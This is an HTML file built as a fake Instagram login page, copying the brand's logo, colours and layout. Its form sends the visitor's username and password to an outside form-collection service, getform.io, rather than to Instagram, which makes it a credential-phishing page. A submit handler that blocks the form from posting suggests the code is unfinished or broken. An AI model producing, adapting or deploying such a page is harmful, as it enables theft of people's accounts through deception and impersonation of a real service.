<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* Reset some default styles */
        body, h1, p, form {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #fafafa; /* Light background color */
            font-family: 'Arial', sans-serif;
        }
        
        .container {
            width: 350px;
            background-color: #fff; /* White background for the form */
            padding: 30px;
            border: 1px solid #dbdbdb; /* Light border */
            border-radius: 5px; /* Slightly rounded corners */
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Soft shadow */
            text-align: center; /* Center text in the container */
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 20px;
            color: #262626; /* Dark text color */
        }
        
        input {
            width: 100%; /* Full width inputs */
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb; /* Light border */
            border-radius: 3px; /* Slightly rounded corners */
            font-size: 14px;
        }
        
        button {
            width: 100%; /* Full width button */
            padding: 10px;
            background-color: #0095f6; /* Instagram blue */
            color: white; /* White text color */
            border: none; /* No border */
            border-radius: 3px; /* Slightly rounded corners */
            font-size: 16px;
            cursor: pointer; /* Pointer cursor on hover */
            margin-top: 10px;
            font-weight: bold; /* Bold text */
        }
        
        button:hover {
            background-color: #007bbf; /* Darker blue on hover */
        }
        
        #message {
            margin-top: 10px;
            color: green;
            text-align: center; /* Center the message text */
        }

        .divider {
            margin: 20px 0;
            text-align: center;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
            position: relative;
            top: 50%;
        }

        .divider::before {
            margin-right: 10px;
        }

        .divider::after {
            margin-left: 10px;
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            color: #0095f6; /* Instagram blue */
        }

        .forgot-password:hover {
            text-decoration: underline; /* Underline on hover */
        }

        .instagram-logo {
            width: 175px; /* Adjust logo size */
            margin-bottom: 20px; /* Spacing from the top */
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <h1>Instagram</h1>
        <form id="login-form" action="https://getform.io/f/akkgovja" method="POST">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <p id="message"></p>
        </form>
        <div class="divider">
            <span>OR</span>
        </div>
        <p class="forgot-password">Forgot password?</p>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            document.getElementById('message').innerText = "Sending...";
            // Optionally add any additional AJAX handling if needed
        });
    </script>
</body>
</html>
